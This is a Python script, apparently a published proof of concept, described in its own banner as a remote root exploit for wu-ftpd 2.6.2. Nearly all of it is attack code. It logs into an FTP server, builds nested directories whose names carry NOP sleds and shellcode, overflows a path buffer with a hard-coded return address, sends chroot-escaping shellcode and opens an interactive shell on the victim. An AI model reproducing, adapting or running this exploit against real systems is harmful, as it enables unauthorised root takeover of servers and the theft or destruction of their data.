#!/usr/bin/python

import sys,time,getopt,ftplib
from exploit import *

# Targets

targets = { \
  'ret': "\x08\xdb\xff\xbf", 'name': "debian / wu-ftpd 2.6.2(1) compiled" \
}

def usage():
  print "usage: wu-realpath.py [-u user] [-p pass] [-d dir] [-t ver] [-h target]"
  print "       -u      username to login to ftp server"
  print "       -p      password to login to ftp server"
  print "       -d      specify the writeable directory"
  print "       -t      target wuftpd version, -t0 for list"
  print "       -h      host running vulnerable wuftp server"
  sys.exit(-1)

def escape_ff(buf):
  string = ""

  for x in buf:
    string = string + x
    if x == '\xff':
      string = string + x

  return string


if __name__ == "__main__":

  print "wu-realpath.c - wuftpd 2.6.2 remote root exploit"
  print "written by bind <bind@insidiae.org>\n"

  targetnum = 0
  writeable = username = password = hostname = ""
  
  try:
    (opts, args) = getopt.getopt(sys.argv[1:], "u:p:d:h:t:")

  except getopt.GetoptError:
    usage()

  for o,a in opts:

    if o in ["-u"]:
      username = a

    if o in ["-p"]:
      password = a

    if o in ["-d"]:
      writeable = a

    if o in ["-h"]:
      hostname = a

    if o in ["-t"]:
      targetnum = a;

  if len(hostname) == 0:
    usage()

  if len(username) == 0:
    usage()

  if len(password) == 0:
    usage()

  if len(writeable) == 0:
    writeable = "/home/" + username

  exploit = exploit()
  sc = linux_shellcode()

  # all created directories are nop sleds and shellcode
  #  shdir = 'A' * (255 - len(sc.read)) + sc.read

  shdir = exploit.nops(255 - len(sc.read)) + sc.read

  # fun alignment calculation
  numslash = 0

  for x in writeable:
    if x == "/":
      numslash = numslash + 1

  dir = writeable.split("/")
  dir = dir[len(dir) - 1]

  size = len(dir) + (numslash + 2)

  if numslash == 1:
    size = (len(dir) * 4) + 3

  if size >= 4:
    rem = size % 4
    rem = 4 - rem

    if rem == 1:
      align = 3
    else:
      align = rem - 2
  
  else:
    if size == 1:
      align = 3
    else:
      align = size - 2

  # create the evilest of directories
  retlen = 255 - len(writeable)
  retdir = ('A' * align) + targets['ret'] * 255
  retdir = retdir[0:retlen]

  print "exploiting " + targets['name']
  print "using %d byte shellcode\n" % len(sc.nchroot)

  # Do first half of exploit

  ftp = ftplib.FTP()
  ftp.connect(hostname)
  ftp.getwelcome()

  try:
    ftp.login(username, password)
  except ftplib.error_perm:
    print "login failed"
    sys.exit(-1)

  print "changing dir: " + writeable

  cmd = escape_ff("CWD " + writeable)
  ftp.sendcmd(cmd)
  
  print "creating evil directory..complete\n"

  i = 0
  while i < 15:

    try:
      cmd = escape_ff("MKD " + shdir)
      ftp.sendcmd(cmd)

    except ftplib.error_perm:
      nothing = 0

    cmd = escape_ff("CWD " + shdir)
    ftp.sendcmd(cmd)

    i = i + 1

  try:
    cmd = escape_ff("MKD " + retdir)
    ftp.sendcmd(cmd)
  except ftplib.error_perm:
    nothing = 0

  ftp.close()

  # Do second half of exploit

  ftp = ftplib.FTP()

  ftp = ftplib.FTP()
  ftp.connect(hostname)
  ftp.getwelcome()

  ftp.login(username, password)
  
  print "changing dir: " + writeable

  cmd = escape_ff("CWD " + writeable)
  ftp.sendcmd(cmd)

  print "removing evil directory..complete\n"
  
  i = 0
  while i < 15:
    try:
      cmd = escape_ff("MKD " + shdir)
      ftp.sendcmd(cmd)

    except ftplib.error_perm:
      nothing = 0

    cmd = escape_ff("CWD " + shdir)
    ftp.sendcmd(cmd)

    i = i + 1

  try:
    cmd = escape_ff("RMD " + retdir)
    ftp.sendcmd(cmd)
  except ftplib.error_perm:
    nothing = 0

  # send our final shellcode
  ftp.sock.send(sc.nchroot)

  # gimme
  exploit.shell(ftp.sock)
